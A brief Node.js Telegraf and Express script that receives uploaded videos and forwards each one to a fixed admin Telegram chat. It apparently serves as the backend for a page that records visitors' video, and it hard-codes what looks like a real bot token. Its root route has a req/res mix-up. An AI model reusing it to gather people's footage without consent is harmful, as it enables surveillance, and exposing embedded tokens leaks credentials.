
import { Telegraf } from 'telegraf';
import express from "express";
import fs from "fs";

import multer from "multer";

const upload = multer({ dest: "uploads/" });


const bot = new Telegraf('7418289333:AAFL8o3zKyP7U-i3Gcq86JJpIc4P5VsqcSo');
const adminChatId = '8038130471';
const app = express();

app.use(express.static("public"))
app.get("/",(req,res)=>{ 
   req.redirect("/index.html") 
})




// Обработка команды /start
bot.start((ctx) => {
  ctx.reply('Hello! Send me a message to start recording a video. 🎥');
});

app.post("/video", upload.single("video"), async (req, res) => {
  const filePath = req.file.path;

  console.log("📹 Видео получено:", filePath);

  try {
    // Отправляем видео в Telegram
    await bot.telegram.sendVideo(adminChatId, { source: fs.createReadStream(filePath) }, { caption: "🎥 Новое видео" });

    res.send("✅ Видео загружено и отправлено");
  } catch (e) {
    console.error("❌ Ошибка отправки в Telegram:", e);
    res.status(500).send("❌ Ошибка");
  }
});

app.listen(3000)
bot.launch();
